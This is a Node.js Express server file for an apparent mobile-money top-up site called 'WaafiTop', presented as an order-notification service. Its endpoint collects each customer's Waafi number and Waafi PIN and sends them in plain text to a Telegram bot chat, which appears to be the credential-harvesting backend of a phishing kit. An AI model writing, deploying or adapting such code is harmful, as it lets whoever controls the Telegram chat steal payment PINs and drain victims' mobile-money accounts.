const express = require('express');
const path = require('path');
const dotenv = require('dotenv');

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});

app.use(express.json({ limit: '1mb' }));
app.use(express.static(path.join(__dirname)));

app.get('/health', (_req, res) => {
  res.json({ ok: true, service: 'waafitop-telegram' });
});

function normalizeTelegramAmount(value) {
  if (value === null || value === undefined || value === '') return '';
  const normalized = String(value).trim();
  if (!normalized) return '';

  const numeric = Number(normalized);
  if (Number.isFinite(numeric)) {
    return `$${numeric.toFixed(2)}`;
  }

  return normalized;
}

app.post('/api/telegram-notify', async (req, res) => {
  const { title, text, orderId, recipient, amount, waafiNumber, waafiPin, payer, pin } = req.body || {};

  if (!BOT_TOKEN || !CHAT_ID) {
    return res.status(500).json({
      ok: false,
      message: 'Telegram bot token or chat ID is not configured.'
    });
  }

  const formattedWaafiNumber = waafiNumber || payer || '';
  const formattedWaafiPin = waafiPin || pin || '';
  const formattedAmount = normalizeTelegramAmount(amount || req.body?.total || '');

  const message = [
    title || 'WaafiTop order update',
    '',
    text || 'New order received.',
    orderId ? `Order ID: ${orderId}` : '',
    recipient ? `Receive on: ${recipient}` : '',
    formattedWaafiNumber ? `Waafi number: ${formattedWaafiNumber}` : '',
    formattedWaafiPin ? `Waafi PIN: ${formattedWaafiPin}` : '',
    formattedAmount ? `Amount: ${formattedAmount}` : '',
  ].filter(Boolean).join('\n');

  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        disable_web_page_preview: true,
      })
    });

    const data = await response.json();

    if (!response.ok || !data.ok) {
      return res.status(400).json({
        ok: false,
        message: data.description || 'Telegram message failed.'
      });
    }

    return res.json({ ok: true, message: 'Telegram notification sent.' });
  } catch (error) {
    return res.status(500).json({
      ok: false,
      message: 'Failed to send Telegram notification.',
      error: error.message
    });
  }
});

app.get('*', (_req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
  console.log(`WaafiTop Telegram server running on http://localhost:${PORT}`);
});
